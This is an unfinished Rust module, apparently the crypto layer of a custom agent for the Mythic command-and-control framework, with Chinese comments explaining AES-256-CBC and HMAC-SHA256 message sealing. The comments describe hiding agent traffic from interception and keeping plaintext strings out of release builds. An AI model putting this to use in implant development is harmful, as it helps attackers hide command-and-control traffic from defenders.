#![allow(unused)]

// 需要遵循mythic的通信协议:uuid(36B)+IV(16B)+Ciphertext+HMAC(32B)

// cbc负责数据保密(链式加密防止内容被窃听),sha-256负责提供底层hash运算,hmac结合密钥负责数据防伪和完整性(给密文和IV防伪,防止中途被篡改)

// 普通应用(微信/浏览器/web/app)开发时,几乎不会手写aes/cbc/hmac.普通应用信任底层传输通道(https的tls 1.2/1.3),浏览器发起请求时,底层tls协议栈(位于内存驱动层)会自动使用aes-gcm或其他方法加密流量,业务代码写的都是明文http,对加密过程无感
// 但c2框架中,必须做应用层二次加密.即在http报文体body内部,手动做一次aes-256-cbc-hmac.避免被中间人代理嗅探出原文.普通网络通信依赖/信任传输层TLS,c2通信把安全建立在应用层.无论外层走明文http/https/dns隧道,数据本身在离开agent内存前会被加密.
// Rust中如果需要调用某个对象的方法,这个方法又定义在某个Trait中.那么这个trait必须先用use引入当前作用域
// Cipher(密码):aes库将通用加密接口(trait)重新导出到这里
// block_padding填充子模块,Pkcs7填充算法结构体:Pkcs7是一个实现了BlockPadding trait的具体结构体.aes是一个块密码,每次固定处理16字节数据块.但实际发送的JSON数长度是任意的,Pkcs7负责在末尾补齐缺失字节,解密后再自动把这部分剔除
// BolckDecryptMut(block数据块+decrypt解密+mut可变):是一个trait.与BlockEncryptMut对应,负责解密.
// KeyIvInit(key密钥+Iv初始向量+Init):定义了如何用key和IV初始化加密规则.
// BlockDecryptMut, BlockEncryptMut, KeyIvInit都是trait,只有Pkcs7是具体结构体
use aes::cipher::{block_padding::Pkcs7, BlockModeDecrypt, BlockModeEncrypt, KeyIvInit};
use base64::prelude::*;
// hamc库中的mac(message authentication code消息认证码) trait:包含先到密码学所有消息认证码的方法,如流式更新数据;封口取值;时间校验,都在后续代码中用到
// aes解决保密性,mac解决完整和真实性
use hmac::Mac;
use rand::Rng;
// sha2是hash算法库,Sha256是一个具体的结构,内部实现了SHA-256算法的逻辑方法
use sha2::Sha256;

// 以上,aes中Pkcs7对明文JSON对齐16字节(补齐/剔除多余字节);KeyIvInit规定通信建立时必须有32B key和16B IV;BlockModeEncrypt将明文转为密文
// sha256是纯粹hash运算,产生固定32字节hash值;hmac更新数据和检查真伪
// 数据从明文到出网过程:
// 1. KeyIvInit ->用密钥和随机IV(rand产生)实例化cbc
// 2. Pkcs7 -> 自动补齐json大小,必须是16字节的倍数.这里假设是32字节
// 3. BlockModeEncrypt -> 转为Ciphertext密文(32字节)
// 4. sha256 -> 计算32字节密文和16BIV的hash值
// 5. mac.update -> 将第三步的IV 和 Ciphertext传入后续的finalize方法
// 6. mac.finalize -> 输出32字节防伪标志
// 7. 将uuid(36B)+IV(16B)+Ciphertext+Tag(32B),整体Base64后发出

// type 类型别名(type alias)
// cbc模式不在乎具体加密算法(只要加密算法支持16字节分组就可以将加密算法嵌入),只负责xor异或和分组链式传递
// aes::Aes256,cbc底层用到的加密算法
type Aes256CbcEnc = cbc::Encryptor<aes::Aes256>;
type Aes256CbcDec = cbc::Decryptor<aes::Aes256>;
// hmac通用的消息认证码结构(完整性签名),本身步绑定具体的hash函数,只要满足hash运算接口,无论md5/sha-1/sha-256/sha-512都可用
type HmacSha256 = hmac::Hmac<Sha256>;

// 原始二进制的uuid是16字节,但mythic c2设计通信协议时,为了方便数据库索引和调试,采用了标准带连字符的文本.即32哥十六制字符+4个端横线=36字节的ascii码.
// 协议位置:位于数据包最前面的36字节是明文uuid,让服务器端识别是哪个agent传来的数据
const UUID_LEN: usize = 36;
// aes-256密钥是32字节(256位),但其分组块大小依然是16字节.aes标准规定:无论密钥是128/196/256位,明文块和iv的长度永远是固定的16字节.因此,cbc模式初始化向量iv只能是16字节长度
const IV_LEN: usize = 16;
// sha-256计算出的hash值是256位(32字节).HMAC-SHA256生成的防伪校验码tag,其长度和底层hash输出完全一致.因此这里是32字节的用于校验真伪
const HMAC_LEN: usize = 32;
// 16+16+32=64;
// 单独的16代表PKCS#7规定填充规则.aes-cbc模式下,合法密文最小长度为16字节
const MIN_ENCRYPTED_PAYLOAD_LEN: usize = IV_LEN + 16 + HMAC_LEN;

// 本地开发和测试环境自动提供Debug,比三件套使用的属性更加全面
//#[cfg_attr(any(debug_assertions, test), derive(Debug))]
// 经过分析最终决定使用错误代码的模式,兼顾release下能够提示错误情况(将错误码发给服务器端),且隐藏任何明文字符串
#[derive(Debug)]
#[derive(PartialEq, Eq, Clone, Copy)]
// 默认情况下,Rust拥有枚举类型内存布局的自由排布权力.此时,每个字段只需要1个字节(8位),这里强制其每个字段严格占用1字节.对极端内存压缩友好
#[repr(u8)]
pub enum CryptoError {
    Base64DecodeError=1,
    PayloadTooShort,
    InvalidKeyLength,
    HmacVerificationFailed,
    DecryptionFailed,
    Utf8Error,
}
// 因为有Clone和Copy,这里并不会转移所有权,导致原变量失效
impl CryptoError {
    #[inline(always)]
    pub const fn code(self)->u8{
        self as u8
    }
}


/// 将数据封装为 Mythic 要求的格式并加密:
/// 结构: Base64( UUID(36B) + IV(16B) + Ciphertext + HMAC(32B) )
///
/// * `data`: 待发送的原始明文字节 (如 JSON 字符串)
/// * `key`: 32 字节 AES/HMAC 共享密钥
/// * `uuid`: 36 字节的 Agent 唯一标识符
pub fn seal_message(data:&[u8],key:&[u8],uuid:&str)->Result<String,CryptoError> {
    if key.len()!=32 {
        return Err(CryptoError::InvalidKeyLength);
    }
    // 1. 生成16字节随机IV(使用rand)
    let mut iv = [0u8;IV_LEN];
    rand::rng().fill_bytes(&mut iv);

    // 2. aes-256-cbc原地加密(PKCS#7 填充)
    let encryptor = Aes256CbcEnc::new_from_slices(key, &iv)
    // 将Result<Aes256CbcEnc, cipher::InvalidLength>转为符合本函数的返回值Result<String, CryptoError>
    .map_err(|_|CryptoError::InvalidKeyLength)?;

    let padded_len = (data.len()/16 +1)*16;
    
todo!()}